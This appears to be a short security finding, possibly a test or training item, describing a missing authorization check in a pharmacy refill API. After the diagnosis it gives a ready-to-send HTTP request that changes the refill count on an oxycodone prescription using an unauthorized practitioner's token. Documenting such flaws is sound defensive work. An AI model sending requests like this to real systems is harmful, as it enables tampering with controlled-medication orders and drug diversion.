diagnosis: The pharmacy refill route handler validates request parameters and body structure via express-openapi-validator, but never verifies whether the authenticated practitioner is the licensed prescriber authorized to modify the designated prescriptionId. Any authenticated user can modify authorized refill counts on controlled medication orders.
exploit_request:
PUT /api/v2/prescriptions/rx_oxycodone_99018/refill HTTP/1.1
Host: pharmacy.health.internal:5002
Authorization: Bearer <unauthorized_practitioner_token>
Content-Type: application/json

{
  "refillCount": 5
}
